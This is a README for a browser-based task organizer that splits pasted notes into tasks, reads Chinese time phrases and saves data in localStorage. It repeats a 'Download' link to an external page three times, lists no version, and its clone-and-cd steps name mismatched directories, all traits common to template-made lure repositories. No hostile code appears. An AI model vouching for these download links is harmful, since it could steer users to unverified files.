# After Work Brain Clearer - Task Management 2026

> **After Work Brain Clearer is a browser-based task organizer that turns unstructured thoughts into scheduled daily tasks, with Chinese time parsing, local-first storage, and offline use.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-parkerdngh4116/after-work-brain-clearer-app?style=flat-square)](https://github.com/ben-parkerdngh4116/after-work-brain-clearer-app)

---

<p align="center">
  <a href="https://ben-parkerdngh4116.github.io/after-work-brain-clearer-app/">
    <img src="https://img.shields.io/badge/Download-After%20Work%20Brain%20Clearer%20Latest-brightgreen?style=for-the-badge" alt="Download After Work Brain Clearer">
  </a>
</p>

> **[Download After Work Brain Clearer](https://ben-parkerdngh4116.github.io/after-work-brain-clearer-app/)**

---

[Download Latest Build](https://ben-parkerdngh4116.github.io/after-work-brain-clearer-app/)

---

## What the App Does

After Work Brain Clearer turns quick notes, reminders, and loosely organized ideas into a clearer task plan. Paste in a block of text and the application separates it into individual tasks while reading Chinese time phrases to determine suitable dates.

The tool provides a simple daily-planning experience without accounts or third-party services. Information stays in the browser through local storage, and the responsive single-page design works on both desktop and mobile displays.

---

## Highlights

- Converts unstructured text into separate actionable tasks.
- Detects Chinese wording that indicates when a task should happen.
- Preserves date or time-period context across related task entries.
- Handles schedules covering one day or multiple days.
- Highlights priority tasks for easier visibility.
- Records completion status and displays overall progress.
- Persists task information through browser `localStorage`.
- Continues working offline without sign-in or connected external services.
- Provides layouts suited to desktop and mobile browsers.

---

## Getting Started

Download the source and enter its directory:

```bash
git clone https://github.com/ben-parkerdngh4116/after-work-brain-clearer-app.git
cd after-work-brain-clearer
```

This is an HTML single-page application, so the main file can be launched directly in a current browser:

```text
Open index.html
```

When developing locally, you may instead run any basic static web server from the project directory and open the local URL it reports.

---

## Using the Application

1. Launch the app in a modern browser.
2. Type or paste thoughts, reminders, or task details.
3. Submit the text to let the parser create tasks.
4. Inspect the resulting tasks and their detected dates.
5. Change scheduling information if the interpretation needs correction.
6. Flag important tasks and update their completion state.
7. Reopen the app in the same browser later to continue using the locally saved list.

For example:

```text
今天整理会议资料
明天联系客户
下周准备项目计划
```

Chinese time phrases in the entries help the parser distribute these tasks over the appropriate dates.

---

## Settings and Data

No account or dedicated configuration file is needed. The browser saves task data with `localStorage`.

To remove all tasks and begin again, delete the site's stored data from the browser's developer tools or site settings. This clears the application's locally saved information for that site.

---

## System Requirements

- A modern browser with JavaScript turned on.
- Responsive support for desktop and mobile browser windows.
- No account or external service connection for ordinary operation.
- Browser local storage enabled so tasks can be retained.
- Internet connectivity is required only for obtaining the application when it is not already stored locally.
- No server runtime or database configuration is needed.

---

## Frequently Asked Questions

### Do I need to create an account?

No. The application works without a login.

### Is offline operation supported?

Yes. After the application has been made available in the browser, its task features are intended to work offline without relying on external services.

### Where does the task list live?

Task records are saved in the browser's `localStorage`. They belong to that browser's site data on the current device.

### Can the parser recognize Chinese time wording?

Yes. It uses Chinese time expressions to classify tasks and can reuse a shared time context for connected entries.

### Are multi-day tasks supported?

Yes. A task may be assigned to a single day or scheduled across several days.

### Why might my tasks no longer be visible?

The browser's site data may have been removed, local storage may be disabled, or the application may have been opened in another browser or on another device. Browser-local data is not synchronized automatically between environments.

### How can I update the application?

Download the newest available build from the project link, then replace the existing local application files with the updated version.

---

## Planned Improvements

- Make parsing more capable with a wider range of unstructured text.
- Improve recognition of Chinese time expressions and shared scheduling context.
- Provide clearer progress information for daily and multi-day work.
- Continue supporting a responsive experience on common desktop and mobile browsers.

---

## License

This project is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for details.
